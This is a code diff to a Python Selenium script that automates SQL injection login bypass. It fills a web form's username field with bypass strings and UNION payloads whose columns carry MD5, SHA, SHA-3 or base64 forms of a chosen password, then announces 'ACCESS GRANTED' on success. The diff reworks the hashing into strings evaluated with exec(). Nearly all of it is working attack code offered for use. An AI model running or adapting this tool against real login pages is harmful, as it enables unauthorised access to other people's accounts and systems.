@@ -14,8 +14,7 @@ import sys
 import re
 import requests
 import argparse
-import hashlib
-import base64
+
 
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
@@ -31,10 +30,11 @@ options = webdriver.ChromeOptions()
 # Turn off to see the browser's value
 #options.headless = True
 browser = webdriver.Chrome(options=options)
-
+login_password = "666666666"
     
 #### Main function
 def crack():
+    
     
 
     bypass_injections = [
@@ -96,52 +96,53 @@ def crack():
                     inject(injection, password, f)
                     
                     
+                    # hash functions, feel free to edit
                     
+                    import hashlib
+                    import base64
+                    functions = [ login_password, 
+                                  "hashlib.md5(b'%s').hexdigest()",
+                                  "hashlib.sha1(b'%s').hexdigest()",
+                                  "hashlib.sha224(b'%s').hexdigest()",
+                                  "hashlib.sha256(b'%s').hexdigest()",
+                                  "hashlib.sha384(b'%s').hexdigest()",
+                                  "hashlib.sha512(b'%s').hexdigest()",
+                                  "hashlib.sha3_224(b'%s').hexdigest()",
+                                  "hashlib.sha3_256(b'%s').hexdigest()",
+                                  "hashlib.sha3_384(b'%s').hexdigest()",
+                                  "hashlib.sha3_512(b'%s').hexdigest()", 
+                                  "base64.b64encode(b'%s').decode('utf-8')"
+                                  ]
+                    
+                    for fn in range(1, len(functions)):
+                        functions[fn] = functions[fn]  % login_password
+                        exec('functions[fn] = %s' % functions[fn])
+                        
                     # Union bypass
+                    injection_column_f = ['' for d in range(0, len(functions))]
                     count = 1
                     for n in range(0, max_columns):
                         
-                        injection_columns = "666666666" if not n else injection_columns + ",666666666" 
-                        injection = bypass_injection % (username, injection_columns)                        
-                        inject(injection, "666666666", f)
+                        #injection_columns = login_password if not n else injection_columns + ",%s" 
+                        #injection = bypass_injection %% (username, injection_columns)
+                        #inject(injection, login_password, f)                        
                         
-                        injection_columns_md5 = ("'%s'" % hashlib.md5(b'666666666').hexdigest()) if not n else injection_columns_md5 + (",'%s'" % hashlib.md5(b'666666666').hexdigest())
-                        injection = bypass_injection % (username, injection_columns_md5)                        
-                        inject(injection, "666666666", f)
                         
-                        injection_columns_sha1 = ("'%s'" % hashlib.sha1(b'666666666').hexdigest()) if not n else injection_columns_sha1 + (",'%s'" % hashlib.sha1(b'666666666').hexdigest())
-                        injection = bypass_injection % (username, injection_columns_sha1)                        
-                        inject(injection, "666666666", f)
+                        for fn in range(0, len(functions)):
                         
-                        injection_columns_sha224 = ("'%s'" % hashlib.sha224(b'666666666').hexdigest()) if not n else injection_columns_sha224 + (",'%s'" % hashlib.sha224(b'666666666').hexdigest())
-                        injection = bypass_injection % (username, injection_columns_sha224)                        
-                        inject(injection, "666666666", f)                          
-                        
-                        injection_columns_sha256 = ("'%s'" % hashlib.sha256(b'666666666').hexdigest()) if not n else injection_columns_sha256 + (",'%s'" % hashlib.sha256(b'666666666').hexdigest())
-                        injection = bypass_injection % (username, injection_columns_sha256)                        
-                        inject(injection, "666666666", f)
-                        
-                        injection_columns_sha384 = ("'%s'" % hashlib.sha384(b'666666666').hexdigest()) if not n else injection_columns_sha384 + (",'%s'" % hashlib.sha384(b'666666666').hexdigest())
-                        injection = bypass_injection % (username, injection_columns_sha384)                        
-                        inject(injection, "666666666", f)
-                        
-                        injection_columns_sha512 = ("'%s'" % hashlib.sha512(b'666666666').hexdigest()) if not n else injection_columns_sha512 + (",'%s'" % hashlib.sha512(b'666666666').hexdigest())
-                        injection = bypass_injection % (username, injection_columns_sha512)                        
-                        inject(injection, "666666666", f)
-
-                        # i found one of this some years ago
-                        injection_columns_base64 = ("'%s'" % base64.b64encode(b'666666666')) if not n else injection_columns_base64 + (",'%s'" % base64.b64encode(b'666666666'))
-                        injection = bypass_injection % (username, injection_columns_base64)                        
-                        inject(injection, "666666666", f)
+                            injection_column_f[fn] = "'%s'" % functions[fn] if not n else injection_column_f[fn] + ",'%s'" % functions[fn]
+                            injection = bypass_injection % (username, injection_column_f[fn])
+                            inject(injection, login_password, f)
+                                               
 
 
 def inject(injection, password, f):
     password_field = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]' % f)
-    username_input = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]/preceding-sibling::input[@type="text"]' % f)
+    username_input = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]/preceding-sibling::input[@type="text"]' % f )
 
     sys.stdout.write("[+] Injecting    %s" % injection)
     username_input[0].send_keys(injection)
-    password_field[0].send_keys(password)
+    password_field[0].send_keys(login_password)
     password_field[0].send_keys(Keys.ENTER)
 
 
@@ -153,7 +154,7 @@ def inject(injection, password, f):
         sys.stdout.write("    SUCCESS!.\n")
         sys.stdout.write('\n[!] boom! i broke your code! ACCCESS GRANTED\n')
         sys.stdout.write('\t Login: %s\n' % injection)
-        sys.stdout.write('\t Password: letmein\n')
+        sys.stdout.write('\t Password: %s\n' % login_password)
         exit()
     
 
